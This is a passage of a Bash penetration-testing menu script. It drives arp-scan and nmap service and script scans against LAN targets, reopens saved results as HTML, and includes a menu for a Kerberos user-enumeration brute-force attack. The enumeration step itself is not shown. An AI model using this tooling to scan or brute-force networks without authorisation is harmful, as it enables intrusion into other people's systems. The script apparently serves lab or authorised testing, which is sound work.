				q | Q | quit | Quit | QUIT)
				exit
				shift
				;;
				*)
				echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again."
				shift
				;;
			esac 
		done
	else
		MASSCAN_RECORD_CHECKER=2
		if [ "$NMAP_STATUS" -eq 1 ]; then
			#resets $NMAP_STATUS
			NMAP_STATUS=0
			#allows user to choose if he/she wants to import nmap saved data
			NMAP_HISTORY_OPTIONS
			#allow user to choose nmap port range
			NMAP_SELECT_PORTS
		fi
	fi
}

#allows user to choose if he/she wants to import nmap saved data
function NMAP_HISTORY_OPTIONS {
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		#assign single $LAN_IP_TARGET to $MASSCAN_TARGET
		MASSCAN_TARGET=$LAN_IP_TARGET
	fi
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		#assign Network $NMAP_TARGET to $MASSCAN_TARGET
		MASSCAN_TARGET=$NMAP_TARGET
	fi
	#assign $MASSCAN_TARGET mac address
	NMAP_TARGETIP_MAC=$(arp-scan $MASSCAN_TARGET | egrep ^$(echo $MASSCAN_TARGET) | awk '{print $2}')
	#access $NMAP_DIR_PATH
	cd $NMAP_DIR_PATH
	#list the file with the most scanned results that matches with the string $MASSCAN_TARGET
	NMAP_RECORD=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | head -n 1)
	NMAP_RECORD_FNAME=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | head -n 1 | sed 's/'.nmap'//')
	#validate if $NMAP_RECORD_FNAME is not empty
	if [ ! -z "$NMAP_RECORD_FNAME" ]; then
		NMAP_XML=$(ls -lSh | grep $(echo $NMAP_RECORD_FNAME) | egrep '\.xml$' | awk '{if ($5 != 0) print $9}' | head -n 1)
	fi
	#validate if default gatewawwy mac address is inside saved record
	if [ ! -z "$NMAP_RECORD" ]; then
		NMTARGETIP_MAC_EXIST=$(grep $NMAP_TARGETIP_MAC $NMAP_RECORD)
	fi
	#validate if $NMAP_RECORD and $NMTARGETIP_MAC_EXIST are not empty
	if [ ! -z "$NMAP_RECORD" ] && [ ! -z "$NMTARGETIP_MAC_EXIST" ]; then 
		echo
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${White}PREVIOUS${NC} ${Light_Cyan}NMAP${NC} ${White}SAVED RECORD WITH THE MOST SCANNED RESULTS${NC}"
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${Light_Purple}[*]${NC} File Name: $(echo $NMAP_RECORD)"
		echo -e "${Light_Purple}[*]${NC} Date/Time: $(echo $NMAP_RECORD | awk -F 'D' '{print $2}' | awk -F 'T' '{print $1}') $(echo $NMAP_RECORD | awk -F 'T' '{print $2}' | awk -F 'Z' '{print $1}')UTC"
		echo -e "\n${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${Light_Cyan}NMAP${NC} ${White}MENU OPTIONS${NC}"
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} View Previously Saved ${Cyan}Nmap${NC} Record With The Most Scanned Results"
		echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} Perform A New Nmap Scan"
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Previous Options"
		echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		#assign checker variable for while loop
		MASSCAN_RECORD_CHECKER=0
		while [ "$MASSCAN_RECORD_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Enter '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}R${NC}', '${Orange}B${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
			read MASSCAN_RECORD_CONFIRM
			case $MASSCAN_RECORD_CONFIRM in
				1 )
				#reset $NMAP_PORTS_IMPORTED_CHECKER
				NMAP_PORTS_IMPORTED_CHECKER=0
				#display $NMAP_DIR_PATH/$NMAP_RECORD to user
				#access $NMAP_DIR_PATH
				cd $NMAP_DIR_PATH
				#list the file with the most scanned results that matches with the string $MASSCAN_TARGET
				NMAP_RECORD=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | head -n 1)
				NMAP_RECORD_FNAME=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | head -n 1 | sed 's/'.nmap'//')
				#validate if the file $NMAP_RECORD exists
				if [ ! -z "$NMAP_RECORD" ]; then
					echo
					cat $NMAP_DIR_PATH/$NMAP_RECORD
					#convert $NMAP_RECORD_FNAME.xml to $NMAP_RECORD_FNAME.html
					xsltproc -o $NMAP_DIR_PATH/$NMAP_RECORD_FNAME.html $NMAP_DIR_PATH/$NMAP_RECORD_FNAME.xml
					#execute firefox in root. takes in 1 argument
					FIREFOX_RUN $NMAP_DIR_PATH/$NMAP_RECORD_FNAME.html 
				else
					echo
					echo -e "${Light_Red}[!]${NC} No Previous Nmap Scanned Data for ${Green}$(echo $MASSCAN_TARGET)${NC}.\n"
				fi
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				2 )
				#reset $NMAP_PORTS_IMPORTED_CHECKER
				NMAP_PORTS_IMPORTED_CHECKER=0
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				r | R | return | Return | RETURN) 
				#reset checker variables to 0 before returning to the main menu
				SINGLE_TARGET_CHECKER=0
				NETWORK_TARGET_CHECKER=0
				#presents to user the main menu to choose a single target or to scan for a local area network
				MAIN_MENU
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				b | B | back | Back | BACK) 
				#list out the arp ip address for the user to select the target
				NMAP_SELECT_TARGET
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				g | G | go | Go | GO) 
				#present the scan/attack menu to the user
				ATTACK_MENU
				MASSCAN_RECORD_CHECKER=1
				shift
				;;
				q | Q | quit | Quit | QUIT)
				exit
				shift
				;;
				*)
				echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again."
				shift
				;;
			esac 
		done
	else
		MASSCAN_RECORD_CHECKER=2
		if [ "$NMAP_STATUS" -eq 1 ]; then
			#resets $NMAP_STATUS
			NMAP_STATUS=0
			#allows user to choose if he/she wants to import nmap saved data
			NMAP_HISTORY_PROMPT
			#allow user to choose nmap port range
			NMAP_SELECT_PORTS
		fi
	fi
}

#allows user to choose if he/she wants to import nmap saved data
function NMAP_HISTORY_PROMPT {
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		#assign single $LAN_IP_TARGET to $MASSCAN_TARGET
		MASSCAN_TARGET=$LAN_IP_TARGET
	fi
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		#assign Network $NMAP_TARGET to $MASSCAN_TARGET
		MASSCAN_TARGET=$NMAP_TARGET
	fi
	#assign $MASSCAN_TARGET mac address
	NMAP_TARGETIP_MAC=$(arp-scan $MASSCAN_TARGET | egrep ^$(echo $MASSCAN_TARGET) | awk '{print $2}')
	#access $NMAP_DIR_PATH
	cd $NMAP_DIR_PATH
	#list the file with the most scanned results that matches with the string $MASSCAN_TARGET
	NMAP_RECORD=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | head -n 1)
	NMAP_RECORD_FNAME=$(ls -lSh | grep $(echo $MASSCAN_TARGET) | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | head -n 1 | sed 's/'.nmap'//')
	#validate if $NMAP_RECORD_FNAME is not empty
	if [ ! -z "$NMAP_RECORD_FNAME" ]; then
		NMAP_XML=$(ls -lSh | grep $(echo $NMAP_RECORD_FNAME) | egrep '\.xml$' | awk '{if ($5 != 0) print $9}' | head -n 1)
	fi
	#validate if default gatewawwy mac address is inside saved record
	if [ ! -z "$NMAP_RECORD" ]; then
		NMTARGETIP_MAC_EXIST=$(grep $NMAP_TARGETIP_MAC $NMAP_RECORD)
	fi
	#validate if $NMAP_RECORD and $NMTARGETIP_MAC_EXIST are not empty
	if [ ! -z "$NMAP_RECORD" ] && [ ! -z "$NMTARGETIP_MAC_EXIST" ]; then 
		echo
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${White}PREVIOUS${NC} ${Light_Cyan}NMAP${NC} ${White}SAVED RECORD WITH THE MOST SCANNED RESULTS${NC}"
		echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
		echo -e "${Light_Purple}[*]${NC} File Name: $(echo $NMAP_RECORD)"
		echo -e "${Light_Purple}[*]${NC} Date/Time: $(echo $NMAP_RECORD | awk -F 'D' '{print $2}' | awk -F 'T' '{print $1}') $(echo $NMAP_RECORD | awk -F 'T' '{print $2}' | awk -F 'Z' '{print $1}')UTC"
	else
		MASSCAN_RECORD_CHECKER=2
	fi
}

#validate if file exists and convert it to a string for nmap ports, take in 1 argument $1
function NMAP_MASSCAN_PORTS {
	NMAP_PORTS_IMPORTED_CHECKER=0
	NMAP_MASSCAN_PORTS_FILENAME=$1
	#validates is $NMAP_MASSCAN_PORTS_FILENAME file exists
	if [ -f "$NMAP_MASSCAN_PORTS_FILENAME" ]; then
		#validate if filesize is not greater than zero
		if [ ! -s "$NMAP_MASSCAN_PORTS_FILENAME" ]; then
			echo -e "${Light_Red}[!]${NC} No hosts detected. Please choose another target."
			#reset checker variables to 0 before returning to the main menu
			SINGLE_TARGET_CHECKER=0
			NETWORK_TARGET_CHECKER=0
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
		else
			#assign masscan imported ports into a variable
			NMAP_PORTS_IMPORTED=$(cat $NMAP_MASSCAN_PORTS_FILENAME | egrep -v ^'#' |  tr '\n' ,)
			NMAP_PORTS_IMPORTED_CHECKER=1
		fi
	else
		echo -e "${Light_Red}[!]${NC} $NMAP_MASSCAN_PORTS_FILENAME file does not exist. Please run $0 again."
		exit
	fi
	NMAP_PORTS_RANGE=$(echo $NMAP_PORTS_IMPORTED)
}

#allow user to choose nmap port range
function NMAP_SELECT_PORTS {
	echo -e "\n${Light_Purple}-----------------------------------------------------------${NC}"
	echo -e "${Light_Cyan}NMAP${NC} ${White}MENU OPTIONS${NC}"
	echo -e "${Light_Purple}-----------------------------------------------------------${NC}"
	echo -e "${Light_Purple}[*]${NC} Target IP Address: ${Green}$MASSCAN_TARGET${NC}"
	echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} Scan All Ports"
	echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} Enter A Range Of Ports"
	echo -e "${Light_Purple}[${Orange}3${NC}${Light_Purple}]${NC} Enter A Single Port"
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Nmap Menu"
	echo -e "${Light_Purple}[${Orange}B${NC}${Light_Purple}]${NC} ${Orange}B${NC}ack To Select Target"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	#assign checker variable for while loop
	NMAP_PORTS_CHECKER=0
	while [ "$NMAP_PORTS_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please choose '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}3${NC}', '${Orange}R${NC}', '${Orange}B${NC}', or '${Orange}Q${NC}' "
		read NMAP_PORTS
		case $NMAP_PORTS in
			1 )
			NMAP_PORTS_RANGE='0-65535'
			#gets user to confirm nmap settings
			NMAP_SETTINGS_CONFIRM
			NMAP_PORTS_CHECKER=1
			shift
			;;
			2 )
			#allow user to enter 2 ports
			NMAP_PORTS_RANGE_SELECT
			#gets user to confirm nmap settings
			NMAP_SETTINGS_CONFIRM
			NMAP_PORTS_CHECKER=1
			shift
			;;
			3 )
			#allow user to enter 1 port
			NMAP_SINGLE_PORT_SELECT
			#gets user to confirm nmap settings
			NMAP_SETTINGS_CONFIRM
			NMAP_PORTS_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN )
			#presents Nmap Menu to the user
			NMAP_MENU
			NMAP_PORTS_CHECKER=1
			shift
			;;
			b | B | back | Back | BACK )
			#presents Masscan Menu to the user
			NMAP_SELECT_TARGET
			NMAP_PORTS_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift
			;;
		esac
	done
}

#allow user to enter 2 ports
function NMAP_PORTS_RANGE_SELECT {
	#assign varbiale to check if string is numbers
	IS_DIGIT='^[0-9]+$'
	#assign checker variable for while loop
	NMAP_PSTART_CHECKER=0
	while [ "$NMAP_PSTART_CHECKER" -eq 0 ]
	do
		echo
		echo -e -n "${Yellow}[?]${NC} Please enter the starting port of the ports range: "
		read NMAP_PORTS_START
		#validate if $NMAP_PORTS_START is empty
		if [ -z "$NMAP_PORTS_START" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please enter a range between port 0-65535."
		elif [[ "$NMAP_PORTS_START" =~ $IS_DIGIT ]] && [ "$NMAP_PORTS_START" -lt 65536 ]; then
			NMAP_PORTS_START=$(echo $NMAP_PORTS_START)
			NMAP_PSTART_CHECKER=1
		else
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter a range between port ${Cyan}0-65535${NC}."
		fi
	done
	#assign checker variable for while loop
	NMAP_PSTOP_CHECKER=0
	while [ "$NMAP_PSTOP_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please enter the ending port of the ports range: "
		read NMAP_PORTS_STOP
		#validate if $NMAP_PORTS_STOP is empty
		if [ -z "$NMAP_PORTS_STOP" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please enter a range between port 0-65535.\n"
		elif [[ "$NMAP_PORTS_STOP" =~ $IS_DIGIT ]] && [ "$NMAP_PORTS_STOP" -lt 65536 ] && [ "$NMAP_PORTS_STOP" -gt $(echo $NMAP_PORTS_START) ]; then
			MASSCAN_PORTS_STOP=$(echo $NMAP_PORTS_STOP)
			NMAP_PSTOP_CHECKER=1
		else
			echo -e "${Light_Red}[!]${NC} Please enter a range between port ${Cyan}0-65535${NC} and greater than ${Cyan}$(echo $NMAP_PORTS_START)${NC}.\n"
		fi
	done
	#assign the selected range to variable $MASSCAN_PORTS
	NMAP_PORTS_RANGE="$(echo $NMAP_PORTS_START)-$(echo $NMAP_PORTS_STOP)"
}

#allow user to enter 1 port
function NMAP_SINGLE_PORT_SELECT {
	#assign varbiale to check if string is numbers
	IS_DIGIT='^[0-9]+$'
	#assign checker variable for while loop
	NMAP_PSINGLE_CHECKER=0
	while [ "$NMAP_PSINGLE_CHECKER" -eq 0 ]
	do
		echo
		echo -e -n "${Yellow}[?]${NC} Please enter a port to scan: "
		read NMAP_SINGLE_PORT
		#validate if $NMAP_SINGLE_PORT is empty
		if [ -z "$NMAP_SINGLE_PORT" ]; then
			echo -e "\n${Light_Red}[!]${NC} No input captured. Please enter a range between port 0-65535."
		elif [[ "$NMAP_SINGLE_PORT" =~ $IS_DIGIT ]] && [ "$NMAP_SINGLE_PORT" -lt 65536 ]; then
			NMAP_SINGLE_PORT=$(echo $NMAP_SINGLE_PORT)
			NMAP_PSINGLE_CHECKER=1
		else
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter a range between port ${Cyan}0-65535${NC}."
		fi
	done
	#assign the selected range to variable $MASSCAN_PORTS
	NMAP_PORTS_RANGE="$(echo $NMAP_SINGLE_PORT)"
}

#gets user to confirm nmap settings
function NMAP_SETTINGS_CONFIRM {
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		NMAP_TARGET=$LAN_IP_TARGET
	fi
	#assign checker variable for while loop
	NMAP_SCONFIRM_CHECKER=0
	while [ "$NMAP_SCONFIRM_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Confirm using ${Light_Purple}nmap${NC} ${Green}$(echo $NMAP_TARGET)${NC} ${Light_Purple}-p${NC} ${Cyan}$(echo $NMAP_PORTS_RANGE)${NC} ${Light_Purple}-sC${NC} ${Light_Purple}-sV${NC} ${Light_Purple}--reason${NC} (y/n)? "
		read NMAP_SETTINGS_CONFIRM
		case $NMAP_SETTINGS_CONFIRM in
			y | Y | yes | Yes | YES)
			#execute nmap on selected target
			NMAP_RUN
			#presents Nmap Menu to the user
			NMAP_MENU
			NMAP_SCONFIRM_CHECKER=1
			shift
			;;
			n | N | no | No | NO)
			#presents Nmap Menu to the user
			NMAP_MENU
			NMAP_SCONFIRM_CHECKER=1
			shift
			;;
			*)
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please enter '${Orange}y${NC}' or '${Orange}n${NC}'."
			shift
			;;
		esac
	done
}

#execute nmap on selected target
function NMAP_RUN {
	#assign $NMAP_TARGET mac address
	NMAP_TARGETIP_MAC=$(arp-scan $NMAP_TARGET | grep $(echo $NMAP_TARGET) | awk '{print $1, $2}')
	#assign variable for date + time
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign nmap output filename
	NMAP_FILENAME=$NMAP_TARGET"-"$DATE_TIME
	echo -e "\n${Light_Purple}[-]${NC} Executing Nmap scanning. Please be patient..."
	#assign session time to variable
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo
	#access $NMAP_DIR_PATH to store files generated by the script
	cd $NMAP_DIR_PATH
	echo -e "${Light_Purple}nmap${NC} ${Green}$(echo $NMAP_TARGET)${NC} ${Light_Purple}-p${NC} ${Cyan}$(echo $NMAP_PORTS_RANGE)${NC} ${Light_Purple}-sC${NC} ${Light_Purple}-sV${NC} ${Light_Purple}--reason${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	#execute nmap scan and save the output
	nmap $(echo $NMAP_TARGET) -p$(echo $NMAP_PORTS_RANGE) -sV -sC --reason -oA $NMAP_FILENAME | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME 
	#validate if $NMAP_FILENAME.gnmap file exists
	if [ -f "$NMAP_FILENAME.gnmap" ]; then
		NMAP_GNMAP_VALIDATE=$(cat $NMAP_FILENAME.gnmap | egrep -v '^#' )
		#validate if fthe file has any results
		if [ -z "$NMAP_GNMAP_VALIDATE" ]; then
			echo -e "${Light_Red}[!]${NC} No Nmap scan results. Please choose another target." | tee -a $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			#presents Nmap Menu to the user
			NMAP_MENU
		else
			#convert $NMAP_FILENAME.xml to $NMAP_FILENAME.html
			xsltproc -o $NMAP_FILENAME.html $NMAP_FILENAME.xml
			#execute firefox in root. takes in 1 argument
			FIREFOX_RUN $NMAP_DIR_PATH/$NMAP_FILENAME.html
			#display the path of saved files to the user
			echo -e "File Saved: $(echo $NMAP_DIR_PATH)/$(echo $NMAP_FILENAME).nmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $NMAP_DIR_PATH)/$(echo $NMAP_FILENAME).gnmap" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $NMAP_DIR_PATH)/$(echo $NMAP_FILENAME).xml" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
			echo -e "File Saved: $(echo $NMAP_DIR_PATH)/$(echo $NMAP_FILENAME).html" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
		fi
	else
		echo -e "${Light_Red}[!]${NC} $NMAP_FILENAME file does not exist. Please run $0 again."
		exit
	fi
}

#presents kerberos Bruteforce Attack menu to the user
function KERBEROS_BF_MENU {
	echo
	echo -e "${Light_Purple}-----------------------------------------${NC}"
	echo -e "${White}${Light_Cyan}KERBEROS ENUMUSERS${NC} ${White}BRUTEFORCE ATTACK MENU${NC}"
	echo -e "${Light_Purple}-----------------------------------------${NC}"
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]] || [[ "$SINGLE_TARGET_CHECKER" -eq 2 ]]; then
	echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}elect Target"
	fi
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		echo -e "${Light_Purple}[*]${NC} Target IP Address: ${Green}$LAN_IP_TARGET${NC}"
		echo -e "${Light_Purple}[${Orange}S${NC}${Light_Purple}]${NC} ${Orange}S${NC}can For ${Cyan}Port 88/Kerberos${NC}"
	fi
	echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn to Main Menu"
	echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
	echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
	echo -e "${Light_Purple}-----------------------------------------${NC}"
	#assign checker variable for while loop
	KERBF_MENU_CHECKER=0
	while [ "$KERBF_MENU_CHECKER" -eq 0 ]
	do
		echo -e -n "${Yellow}[?]${NC} Please select '${Orange}S${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
		read KERBF_MENU_CHOICE
		case $KERBF_MENU_CHOICE in
			s | S | select | Select | SELECT| scan | Scan | SCAN)
			#validate if user selected single target scan
			if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
				#allows user to view past kerberos record
				KERBF_HISTORY_PROMPT
				if [[ "$KERBEROS_RECORD_CHECKER" -eq 2 ]]; then
					#execute nmap on selected target for kerberos
					KERP88_NMAP_RUN
				fi
				SINGLE_TARGET_CHECKER=2
				#presents kerberos Bruteforce Attack menu to the user
				KERBEROS_BF_MENU
			fi
			#validate if user selected network scan
			if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]] || [[ "$SINGLE_TARGET_CHECKER" -eq 2 ]]; then
				#execute nmap scan for kerberos and save it to a file and allow user to select the target
				KERBF_SELECT_TARGET
				#presents kerberos Bruteforce Attack menu to the user
				KERBEROS_BF_MENU
			fi
			KERBF_MENU_CHECKER=1
			shift
			;;
			r | R | return | Return | RETURN)
			#presents to user the main menu to choose a single target or to scan for a local area network
			MAIN_MENU
			KERBF_MENU_CHECKER=1
			shift
			;;
			g | G | go | Go | GO)
			#present the scan/attack menu to the user
			ATTACK_MENU
			KERBF_MENU_CHECKER=1
			shift
			;;
			q | Q | quit | Quit | QUIT )
			exit
			shift
			;;
			* )
			echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
			shift 
			;;
		esac
	done
}

#allows user to view past kerberos record
function KERBF_HISTORY_PROMPT {
	#validate if user selected single target scan
	if [[ "$SINGLE_TARGET_CHECKER" -eq 1 ]]; then
		#assign single $LAN_IP_TARGET to $KERBEROS_TARGET
		KERBEROS_TARGET=$LAN_IP_TARGET
	fi
	#validate if user selected network scan
	if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
		#assign Network $NMAP_TARGET to $MASSCAN_TARGET
		KERBEROS_TARGET=$KERBF_TARGET
	fi
	#assign $KERBEROS_TARGET mac address
	KERBF_TARGETIP_MAC=$(arp-scan $KERBEROS_TARGET | egrep ^$(echo $KERBEROS_TARGET) | awk '{print $2}')
	#access $KERBEROS_DIR_PATH
	cd $KERBEROS_DIR_PATH
	#list the file with the most recent scanned results that matches with the string $KERBEROS_TARGET
	KERNMAP_RECORD=$(ls -lArt | grep $(echo $KERBEROS_TARGET) | grep -v kerenum | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | tail -n 1)
	KERNMAP_RECORD_FNAME=$(ls -lArt | grep $(echo $KERBEROS_TARGET) | grep -v kerenum | egrep '\.nmap$' | awk '{if ($5 != 0) print $9}' | tail -n 1 | sed 's/'\.nmap'//')
	#validate if $KERNMAP_RECORD_FNAME is not empty
	if [ ! -z "$KERNMAP_RECORD_FNAME" ]; then
		KERNMAP_XML=$(ls -lArt | grep $(echo $KERBEROS_TARGET) | grep -v kerenum | egrep '\.xml$' | awk '{if ($5 != 0) print $9}' | tail -n 1)
	fi
	#validate if default gateway mac address is inside saved record
	if [ ! -z "$KERNMAP_RECORD" ]; then
		KERTARGETIP_MAC_EXIST=$(grep -i $KERBF_TARGETIP_MAC $KERNMAP_RECORD)
	fi
	#validate if $KERNMAP_RECORD and $KERTARGETIP_MAC_EXIST are not empty
	if [ ! -z "$KERNMAP_RECORD" ] && [ ! -z "$KERTARGETIP_MAC_EXIST" ]; then 
		echo
		echo -e "${Light_Purple}------------------------------------------------------------${NC}"
		echo -e "${White}PREVIOUS${NC} ${Light_Cyan}NMAP${NC} ${White}SAVED RECORD WITH OPEN ${Light_Cyan}PORT 88${NC} ${White}SCANNED RESULTS${NC}"
		echo -e "${Light_Purple}------------------------------------------------------------${NC}"
		echo -e "${Light_Purple}[*]${NC} File Name: $(echo $KERNMAP_RECORD)"
		echo -e "${Light_Purple}[*]${NC} Date/Time: $(echo $KERNMAP_RECORD | awk -F 'D' '{print $2}' | awk -F 'T' '{print $1}') $(echo $NMAP_RECORD | awk -F 'T' '{print $2}' | awk -F 'Z' '{print $1}')UTC"
		echo
		cat $KERBEROS_DIR_PATH/$KERNMAP_RECORD | egrep -v '^#' | egrep -v -i 'incorrect' | egrep -v '^Service detection performed' | egrep -v '^Host is up' | grep '\S'
		#convert $NMAP_RECORD_FNAME.xml to $NMAP_RECORD_FNAME.html
		xsltproc -o $KERBEROS_DIR_PATH/$KERNMAP_RECORD_FNAME.html $KERBEROS_DIR_PATH/$KERNMAP_RECORD_FNAME.xml
		#execute firefox in root. takes in 1 argument
		FIREFOX_RUN $KERBEROS_DIR_PATH/$KERNMAP_RECORD_FNAME.html 
		echo -e "\n${Light_Purple}------------------------------------------------------------${NC}"
		echo -e "${Light_Purple}[*]${NC} Target IP Address: ${Green}$KERBEROS_TARGET${NC}"
		echo -e "${Light_Purple}[${Orange}1${NC}${Light_Purple}]${NC} Import Previously Saved Record"
		echo -e "${Light_Purple}[${Orange}2${NC}${Light_Purple}]${NC} Start A New Nmap Scan"
		echo -e "${Light_Purple}[${Orange}R${NC}${Light_Purple}]${NC} ${Orange}R${NC}eturn To Main Menu"
		echo -e "${Light_Purple}[${Orange}G${NC}${Light_Purple}]${NC} ${Orange}G${NC}o To Scanning/Attack Menu"
		echo -e "${Light_Purple}[${Orange}Q${NC}${Light_Purple}]${NC} ${Orange}Q${NC}uit"
		echo -e "${Light_Purple}------------------------------------------------------------${NC}"
		#assign checker variable for while loop
		KERNMAP_RECORD_CHECKER=0
		while [ "$KERNMAP_RECORD_CHECKER" -eq 0 ]
		do
			echo -e -n "${Yellow}[?]${NC} Enter '${Orange}1${NC}', '${Orange}2${NC}', '${Orange}R${NC}', '${Orange}G${NC}' or '${Orange}Q${NC}': "
			read KERNMAP_RECORD_CONFIRM
			case $KERNMAP_RECORD_CONFIRM in
				1 )
				KERBEROS_ENUMUSERS_RUN
				KERNMAP_RECORD_CHECKER=1
				shift
				;;
				2 )
				#execute nmap on selected target for kerberos
				KERP88_NMAP_RUN
				#assign $KERP88_NMAP_FILENAME from KERP88_NMAP_RUN function to 
				KERNMAP_RECORD=$KERP88_NMAP_FILENAME.nmap
				#execute nmap script for kerberos enumusers bruteforce attack
				KERBEROS_ENUMUSERS_RUN
				KERNMAP_RECORD_CHECKER=1
				shift
				;;
				r | R | return | Return | RETURN) 
				#reset checker variables to 0 before returning to the main menu
				SINGLE_TARGET_CHECKER=0
				NETWORK_TARGET_CHECKER=0
				#presents to user the main menu to choose a single target or to scan for a local area network
				MAIN_MENU
				KERNMAP_RECORD_CHECKER=1
				shift
				;;
				g | G | go | Go | GO) 
				#present the scan/attack menu to the user
				ATTACK_MENU
				KERNMAP_RECORD_CHECKER=1
				shift
				;;
				q | Q | quit | Quit | QUIT)
				exit
				shift
				;;
				*)
				echo -e "\n${Light_Red}[!]${NC} Wrong input. Please try again.\n"
				shift
				;;
			esac 
		done
	else
		if [[ "$NETWORK_TARGET_CHECKER" -eq 1 ]]; then
			KERBEROS_ENUMUSERS_RUN
		fi
		KERBEROS_RECORD_CHECKER=2
	fi
}

#execute nmap on selected target for kerberos
function KERP88_NMAP_RUN {
	#assign $NMAP_TARGET mac address
	NMAP_TARGETIP_MAC=$(arp-scan $KERBEROS_TARGET | egrep ^$(echo $KERBEROS_TARGET) | awk '{print $2}')
	#assign variable for date + time
	DATE_TIME=$(date -u +"D%FT%H:%M:%SZ")
	#assign nmap output filename
	KERP88_NMAP_FILENAME=$KERBEROS_TARGET"-"$DATE_TIME
	echo -e "\n${Light_Purple}[-]${NC} Executing Nmap scanning for Kerberos. Please be patient..."
	#assign session time to variable 
	DATETIME_UTC_SESSION=$(date -u +"%F %H:%M:%S")
	echo -e "\n${White}Event Date/Time: $(echo $DATETIME_UTC_SESSION) UTC${NC}" >> $SESSION_DIR_PATH/$SESSION_ID_FILENAME
	echo
	#access $KERBEROS_DIR_PATH to store files generated by the script
	cd $KERBEROS_DIR_PATH
